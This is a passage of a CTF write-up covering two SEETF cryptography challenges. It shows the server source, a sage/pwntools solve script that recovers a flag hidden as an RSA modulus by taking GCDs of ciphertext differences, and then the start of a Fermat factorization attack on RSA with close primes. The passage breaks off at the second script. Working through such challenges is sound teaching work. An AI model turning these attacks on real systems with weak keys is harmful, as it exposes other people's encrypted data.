</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Author: coff33
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>I&#39;ve hidden my flag as a modulus, I&#39;m sure no one will be able to retrieve it.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nc fun.chall.seetf.sg 30004
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="initial-analysis-3">Initial Analysis <a href="#initial-analysis-3" class="anchor">#</a></h3>
<p>We were given one file which is the code of the running server.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> getPrime, long_to_bytes, bytes_to_long
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">with</span> <span style="color:#366">open</span>(<span style="color:#c30">&#34;flag.txt&#34;</span>, <span style="color:#c30">&#34;rb&#34;</span>) <span style="color:#069;font-weight:bold">as</span> f:
</span></span><span style="display:flex;"><span>    FLAG <span style="color:#555">=</span> f<span style="color:#555">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>n <span style="color:#555">=</span> bytes_to_long(FLAG)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#09f;font-style:italic">#make sure i have a big modulus</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">while</span> n<span style="color:#555">.</span>bit_length() <span style="color:#555">&lt;</span> <span style="color:#f60">2048</span>:
</span></span><span style="display:flex;"><span>    n <span style="color:#555">*=</span> n
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">encrypt</span>(m1, m2):
</span></span><span style="display:flex;"><span>    e <span style="color:#555">=</span> getPrime(<span style="color:#f60">256</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">assert</span> m1<span style="color:#555">.</span>bit_length() <span style="color:#555">&gt;=</span> <span style="color:#f60">1600</span> <span style="color:#000;font-weight:bold">and</span> long_to_bytes(m1)<span style="color:#555">.</span>startswith(<span style="color:#c30">b</span><span style="color:#c30">&#34;SEE{&#34;</span>), <span style="color:#c30">&#39;first message must be at least 1600 bits and begin with &#34;SEE{&#34;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">assert</span> <span style="color:#f60">500</span> <span style="color:#555">&lt;=</span> m2<span style="color:#555">.</span>bit_length() <span style="color:#555">&lt;=</span> <span style="color:#f60">600</span>, <span style="color:#c30">&#39;second message must be within 500 to 600 bits&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">return</span> <span style="color:#366">pow</span>(m1, e, n), <span style="color:#366">pow</span>(m2, e, n)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">def</span> <span style="color:#c0f">main</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>        m1 <span style="color:#555">=</span> <span style="color:#366">int</span>(<span style="color:#366">input</span>(<span style="color:#c30">&#34;Message 1 (as integer) : &#34;</span>)<span style="color:#555">.</span>strip())
</span></span><span style="display:flex;"><span>        m2 <span style="color:#555">=</span> <span style="color:#366">int</span>(<span style="color:#366">input</span>(<span style="color:#c30">&#34;Message 2 (as integer) : &#34;</span>)<span style="color:#555">.</span>strip())
</span></span><span style="display:flex;"><span>        c1, c2 <span style="color:#555">=</span> encrypt(m1, m2)
</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#34;</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">Ciphers: </span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#a00">{</span>[c1,c2]<span style="color:#a00">}</span><span style="color:#c30">&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">except</span> <span style="color:#c00;font-weight:bold">Exception</span> <span style="color:#069;font-weight:bold">as</span> e:
</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(e)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">if</span> __name__ <span style="color:#555">==</span> <span style="color:#c30">&#39;__main__&#39;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, reading through the code, the goal is we need to retrieve $N$, where $N$ is the flag. And then the server will gave us chance to encrypt two message. $e$ is a 256-prime. There is constraint, where:</p>
<ul>
<li>First message bits &gt;= 1600, and must start with <code>SEE{</code></li>
<li>Second message bits range is 500-600 bits inclusive</li>
</ul>
<p>The server will return both of the encryption result.</p>
<h3 id="exploitation-plan-3">Exploitation Plan <a href="#exploitation-plan-3" class="anchor">#</a></h3>
<p>We don&rsquo;t know $e$ and $N$ value, and our task is to retrieve $N$. Suppose that we have message $m$, and $m_1=m^3$, $m_2=m$. Consider this equations.
$$
\begin{align}
\tag{1}
c_1 &amp;\equiv m_1^{e} \mod N \\
c_1 &amp;\equiv (m^3)^{e} \mod N \\
c_1 &amp;= m^{3e} + k_1N \\
\end{align}
$$
where $k_1$ is unknown constant. Now, check out this equation.
$$
\begin{align*}
c_2 &amp;\equiv m_2^{e} \mod N \\
c_2 &amp;\equiv m^{e} \mod N \\
c_2 &amp;= m^{e} + k_2N \\
\end{align*}
$$
Notice that if we cubed the $c_2$,
$$
\begin{align}
\tag{2}
(c_2)^3 &amp;\equiv (m^{e})^3 \mod N \\
(c_2)^3 &amp;\equiv m^{3e} \mod N \\
(c_2)^3 &amp;= m^{3e} + k_2N \\
\end{align}
$$
we will get another equation, where $k_2$ is unknown constant. Notice that we can eliminate first and second equation to finally get the final equation
$$
\begin{align}
\tag{3}
(c_2)^3-c_1 = k_3N
\end{align}
$$
where $k3$ is unknown constant ($k2-k1$).</p>
<p>Notes that, we can connect to the server multiple times, and the $N$ will remain constant as it is the flag. So, we can retrieve multiple value of $kN$, and then we can simply $\gcd$ them to retrieve $N$, as their greatest shared common factor will be $N$.</p>
<h4 id="bypassing-the-constraint">Bypassing the constraint <a href="#bypassing-the-constraint" class="anchor">#</a></h4>
<p>Remember that we have constraints where the $m_1$ need to start with <code>SEE{</code> and has &gt;= 1600 bits and $m_2$ bits need to be inclusively in range 500-600 bits. The trick is:</p>
<ul>
<li>We can generate any string start with <code>SEE{</code> and the bit length is ~1650-1655 bits.</li>
<li>Cube root it and ceil it. Use this as the $m_2$ value. It should be around ~555 bits, which fulfilled our constraint.</li>
<li>And then we can simply cubed it again, so that we can get a value, which is cubed and start with <code>SEE{</code>.</li>
</ul>
<h3 id="solution-4">Solution <a href="#solution-4" class="anchor">#</a></h3>
<p>Below is the script (sage) that we used to solve the chall. Notes that after retrieving the $N$, we need to recursively square root the value until the flag is shown, because the server is multiplying the $N$ with itself until the bit length is &gt;= 2048 bits. Base is the floating number of string <code>SEE{\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code>.</p>
<p>What we do is trying to retrieve 3 values of $kN$ from the server, where the base got increased by 100 everytime we connect to the server (You can actually choose any number as long as the resulted string still start with <code>SEE{</code>).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>context<span style="color:#555">.</span>arch <span style="color:#555">=</span> <span style="color:#c30">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>encoding <span style="color:#555">=</span> <span style="color:#c30">&#39;latin&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#555">.</span>log_level <span style="color:#555">=</span> <span style="color:#c30">&#39;INFO&#39;</span>
</span></span><span style="display:flex;"><span>warnings<span style="color:#555">.</span>simplefilter(<span style="color:#c30">&#34;ignore&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ciphers <span style="color:#555">=</span> []
</span></span><span style="display:flex;"><span>base <span style="color:#555">=</span> <span style="color:#f60">1.042136251760143366506601807791988359319192691917171290357448975749297374332472918910336805121784438281032305192209641733246059254524343284842603532996893119630072194458573013182932211946066537154955757274996373792440408972772708612077293733088200523229587153426763869162843302917457460893081839309369693718313098014501280069768531917574936731772140218047013318220556767781460996826455691622726550851494076382147744402895756978565209185302235414692929592677548505590430613815557144449326412657065984e498</span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">for</span> i <span style="color:#000;font-weight:bold">in</span> <span style="color:#366">range</span>(<span style="color:#f60">3</span>):
</span></span><span style="display:flex;"><span>    x <span style="color:#555">=</span> base<span style="color:#555">+</span>i<span style="color:#555">*</span><span style="color:#f60">100</span>
</span></span><span style="display:flex;"><span>    m2 <span style="color:#555">=</span> ceil(x<span style="color:#555">.</span>nth_root(<span style="color:#f60">3</span>))
</span></span><span style="display:flex;"><span>    m1 <span style="color:#555">=</span> m2<span style="color:#555">^</span><span style="color:#f60">3</span>
</span></span><span style="display:flex;"><span>    r <span style="color:#555">=</span> remote(<span style="color:#c30">&#39;fun.chall.seetf.sg&#39;</span>, <span style="color:#f60">30004</span>)
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;(as integer) : &#39;</span>, <span style="color:#366">str</span>(m1)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>sendlineafter(<span style="color:#c30">b</span><span style="color:#c30">&#39;(as integer) : &#39;</span>, <span style="color:#366">str</span>(m2)<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>    r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;Ciphers: &#39;</span>)
</span></span><span style="display:flex;"><span>    out <span style="color:#555">=</span> <span style="color:#366">eval</span>(r<span style="color:#555">.</span>recvuntil(<span style="color:#c30">b</span><span style="color:#c30">&#39;]&#39;</span>))
</span></span><span style="display:flex;"><span>    ciphers<span style="color:#555">.</span>append(out)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>x1 <span style="color:#555">=</span> ciphers[<span style="color:#f60">0</span>][<span style="color:#f60">1</span>]<span style="color:#555">^</span><span style="color:#f60">3</span> <span style="color:#555">-</span> ciphers[<span style="color:#f60">0</span>][<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>x2 <span style="color:#555">=</span> ciphers[<span style="color:#f60">1</span>][<span style="color:#f60">1</span>]<span style="color:#555">^</span><span style="color:#f60">3</span> <span style="color:#555">-</span> ciphers[<span style="color:#f60">1</span>][<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>x3 <span style="color:#555">=</span> ciphers[<span style="color:#f60">2</span>][<span style="color:#f60">1</span>]<span style="color:#555">^</span><span style="color:#f60">3</span> <span style="color:#555">-</span> ciphers[<span style="color:#f60">2</span>][<span style="color:#f60">0</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>flag <span style="color:#555">=</span> gcd(gcd(x1, x2), x3)
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">while</span> <span style="color:#069;font-weight:bold">True</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">try</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(<span style="color:#c30">&#39;------------------------&#39;</span>)
</span></span><span style="display:flex;"><span>        flag <span style="color:#555">=</span> flag<span style="color:#555">.</span>nth_root(<span style="color:#f60">2</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#366">print</span>(long_to_bytes(flag))
</span></span><span style="display:flex;"><span>    <span style="color:#069;font-weight:bold">except</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#069;font-weight:bold">break</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="result-4">Result <a href="#result-4" class="anchor">#</a></h4>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/MwiKHeS.png" alt=""  />
</p></p>
<blockquote>
<p>Flag: <code>SEE{common_moduli_with_common_exponents_daf4ede8dda5c}</code></p>
</blockquote>
<h2 id="close-enough">Close Enough <a href="#close-enough" class="anchor">#</a></h2>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Author: TheMythologist
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>My prof mentioned something about not using primes that are close to each other in RSA, but it&#39;s close enough, isn&#39;t it?
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Ciphertext is 4881495507745813082308282986718149515999022572229780274224400469722585868147852608187509420010185039618775981404400401792885121498931245511345550975906095728230775307758109150488484338848321930294974674504775451613333664851564381516108124030753196722125755223318280818682830523620259537479611172718588812979116127220273108594966911232629219195957347063537672749158765130948724281974252007489981278474243333628204092770981850816536671234821284093955702677837464584916991535090769911997642606614464990834915992346639919961494157328623213393722370119570740146804362651976343633725091450303521253550650219753876236656017
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="initial-analysis-4">Initial Analysis <a href="#initial-analysis-4" class="anchor">#</a></h3>
<p>We were given two attached files, the encryption script and the public key. Let&rsquo;s check it</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.Util.number</span> <span style="color:#069;font-weight:bold">import</span> getPrime, bytes_to_long
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">Crypto.PublicKey</span> <span style="color:#069;font-weight:bold">import</span> RSA
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">from</span> <span style="color:#0cf;font-weight:bold">secret</span> <span style="color:#069;font-weight:bold">import</span> flag, getNextPrime
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#555">=</span> getPrime(<span style="color:#f60">1024</span>)
</span></span><span style="display:flex;"><span>q <span style="color:#555">=</span> getNextPrime(p)
</span></span><span style="display:flex;"><span>n <span style="color:#555">=</span> p <span style="color:#555">*</span> q
</span></span><span style="display:flex;"><span>e <span style="color:#555">=</span> <span style="color:#f60">65537</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>key <span style="color:#555">=</span> RSA<span style="color:#555">.</span>construct((n, e))<span style="color:#555">.</span>export_key()<span style="color:#555">.</span>decode()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#069;font-weight:bold">with</span> <span style="color:#366">open</span>(<span style="color:#c30">&#34;key&#34;</span>, <span style="color:#c30">&#34;w&#34;</span>) <span style="color:#069;font-weight:bold">as</span> f:
</span></span><span style="display:flex;"><span>    f<span style="color:#555">.</span>write(key)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>m <span style="color:#555">=</span> bytes_to_long(flag<span style="color:#555">.</span>encode())
</span></span><span style="display:flex;"><span>c <span style="color:#555">=</span> <span style="color:#366">pow</span>(m, e, n)
</span></span><span style="display:flex;"><span><span style="color:#366">print</span>(<span style="color:#c30">f</span><span style="color:#c30">&#34;c = </span><span style="color:#a00">{</span>c<span style="color:#a00">}</span><span style="color:#c30">&#34;</span>)
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, we can notice that the prime that is being used is very close, which mean that we can easily factor it using the fermat attack. The base of fermat method is based on this equation. Suppose that,
$$
N = a^{2}-b^{2}
$$
then, we can transform it into
$$
N = (a+b)(a-b)
$$
and because it is close, we can assume that b is small, so that in order to factorize the $N$, we can simply square root the $N$ to initialize our $a$ value, and then try to increase its value until $a^{2}-N$ is a square number, which mean we found $b^{2}$.</p>
<h3 id="solution-5">Solution <a href="#solution-5" class="anchor">#</a></h3>
<p>Below is the solution script that we use (sage script)</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
